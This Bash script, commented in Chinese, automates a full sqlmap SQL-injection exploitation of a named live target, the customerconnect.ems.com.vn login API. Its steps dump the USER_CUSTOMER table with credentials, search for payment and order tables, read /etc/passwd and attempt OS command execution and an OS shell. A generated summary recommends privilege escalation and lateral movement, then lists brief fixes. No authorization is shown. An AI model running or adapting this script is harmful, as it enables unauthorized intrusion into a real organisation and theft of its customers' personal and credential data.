#!/bin/bash
# SQLMap 自动化深度利用脚本
# 目标: customerconnect.ems.com.vn

TARGET_URL="https://customerconnect.ems.com.vn/api/User_Customer/Login"
DATA='{"Username":"*","Password":"test"}'
SQLMAP="/tmp/sqlmap-git/sqlmap.py"

echo "=========================================="
echo "🎯 SQLMap 深度利用开始"
echo "目标: $TARGET_URL"
echo "=========================================="
echo ""

# 创建输出目录
OUTPUT_DIR="/workspace/sqlmap_results"
mkdir -p $OUTPUT_DIR

# 1. 基本注入测试
echo "[1] 基本SQL注入检测..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --flush-session \
  2>&1 | tee "$OUTPUT_DIR/01_basic_test.txt"

echo ""
echo "=========================================="

# 2. 获取数据库版本和基本信息
echo "[2] 获取数据库版本信息..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --banner \
  2>&1 | tee "$OUTPUT_DIR/02_banner.txt"

echo ""
echo "=========================================="

# 3. 获取当前用户
echo "[3] 获取当前数据库用户..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --current-user \
  2>&1 | tee "$OUTPUT_DIR/03_current_user.txt"

echo ""
echo "=========================================="

# 4. 获取当前数据库
echo "[4] 获取当前数据库..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --current-db \
  2>&1 | tee "$OUTPUT_DIR/04_current_db.txt"

echo ""
echo "=========================================="

# 5. 检查DBA权限
echo "[5] 检查是否为DBA..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --is-dba \
  2>&1 | tee "$OUTPUT_DIR/05_is_dba.txt"

echo ""
echo "=========================================="

# 6. 获取所有数据库
echo "[6] 枚举所有数据库..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --dbs \
  2>&1 | tee "$OUTPUT_DIR/06_databases.txt"

echo ""
echo "=========================================="

# 7. 获取BCCPCOM数据库的所有表
echo "[7] 枚举BCCPCOM的所有表..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  -D BCCPCOM \
  --tables \
  2>&1 | tee "$OUTPUT_DIR/07_tables.txt"

echo ""
echo "=========================================="

# 8. 获取USER_CUSTOMER表的列
echo "[8] 获取USER_CUSTOMER表结构..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  -D BCCPCOM \
  -T USER_CUSTOMER \
  --columns \
  2>&1 | tee "$OUTPUT_DIR/08_user_customer_columns.txt"

echo ""
echo "=========================================="

# 9. dump USER_CUSTOMER表的所有数据
echo "[9] 提取USER_CUSTOMER表数据..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  -D BCCPCOM \
  -T USER_CUSTOMER \
  --dump \
  2>&1 | tee "$OUTPUT_DIR/09_user_customer_dump.txt"

echo ""
echo "=========================================="

# 10. 搜索敏感表（订单、客户等）
echo "[10] 搜索敏感表..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  -D BCCPCOM \
  --tables \
  --search -T "ORDER,CUSTOMER,PAYMENT,INVOICE,TRACKING" \
  2>&1 | tee "$OUTPUT_DIR/10_sensitive_tables.txt"

echo ""
echo "=========================================="

# 11. 执行自定义SQL查询 - 获取用户权限
echo "[11] 获取用户权限..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --sql-query="SELECT * FROM USER_SYS_PRIVS WHERE ROWNUM<=10" \
  2>&1 | tee "$OUTPUT_DIR/11_privileges.txt"

echo ""
echo "=========================================="

# 12. 执行自定义SQL查询 - 获取表数量
echo "[12] 获取数据库表统计..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --sql-query="SELECT COUNT(*) FROM USER_TABLES" \
  2>&1 | tee "$OUTPUT_DIR/12_table_count.txt"

echo ""
echo "=========================================="

# 13. 尝试读取文件（如果有权限）
echo "[13] 尝试文件读取..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --file-read="/etc/passwd" \
  2>&1 | tee "$OUTPUT_DIR/13_file_read.txt" || echo "[!] 文件读取失败或无权限"

echo ""
echo "=========================================="

# 14. 尝试OS命令执行（高级）
echo "[14] 尝试OS命令执行..."
python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --os-cmd="whoami" \
  2>&1 | tee "$OUTPUT_DIR/14_os_cmd.txt" || echo "[!] OS命令执行失败或无权限"

echo ""
echo "=========================================="

# 15. 尝试获取OS Shell
echo "[15] 尝试获取OS Shell..."
echo "n" | python3 $SQLMAP \
  -u "$TARGET_URL" \
  --data "$DATA" \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --os-shell \
  2>&1 | tee "$OUTPUT_DIR/15_os_shell.txt" || echo "[!] OS Shell失败或无权限"

echo ""
echo "=========================================="
echo "✅ SQLMap 深度利用完成！"
echo "所有结果已保存到: $OUTPUT_DIR"
echo "=========================================="

# 生成摘要报告
echo ""
echo "📊 生成摘要报告..."
cat > "$OUTPUT_DIR/SUMMARY.md" << 'EOF'
# SQLMap 深度利用摘要报告

## 目标信息
- URL: https://customerconnect.ems.com.vn/api/User_Customer/Login
- 注入点: JSON参数 Username
- 数据库类型: Oracle

## 测试结果

### 1. 注入确认
详见: 01_basic_test.txt

### 2. 数据库版本
详见: 02_banner.txt

### 3. 当前用户
详见: 03_current_user.txt

### 4. 当前数据库
详见: 04_current_db.txt

### 5. DBA权限检查
详见: 05_is_dba.txt

### 6. 数据库枚举
详见: 06_databases.txt

### 7. 表枚举
详见: 07_tables.txt

### 8. USER_CUSTOMER表结构
详见: 08_user_customer_columns.txt

### 9. USER_CUSTOMER数据提取
详见: 09_user_customer_dump.txt
**⚠️ 可能包含敏感数据：用户名、密码等**

### 10. 敏感表搜索
详见: 10_sensitive_tables.txt

### 11. 用户权限
详见: 11_privileges.txt

### 12. 数据库统计
详见: 12_table_count.txt

### 13. 文件读取测试
详见: 13_file_read.txt

### 14. OS命令执行测试
详见: 14_os_cmd.txt

### 15. OS Shell测试
详见: 15_os_shell.txt

## 下一步建议

1. 分析提取的用户数据
2. 检查是否有敏感业务表（订单、支付等）
3. 如果有DBA权限，尝试进一步提权
4. 分析可能的横向移动路径
5. 准备完整的安全报告

## 修复建议

1. **立即修复**: 使用参数化查询
2. **部署WAF**: 拦截SQL注入攻击
3. **最小权限**: 数据库用户权限最小化
4. **监控告警**: 添加异常SQL查询监控
5. **安全审计**: 全面代码安全审计
EOF

echo "✅ 摘要报告已生成: $OUTPUT_DIR/SUMMARY.md"
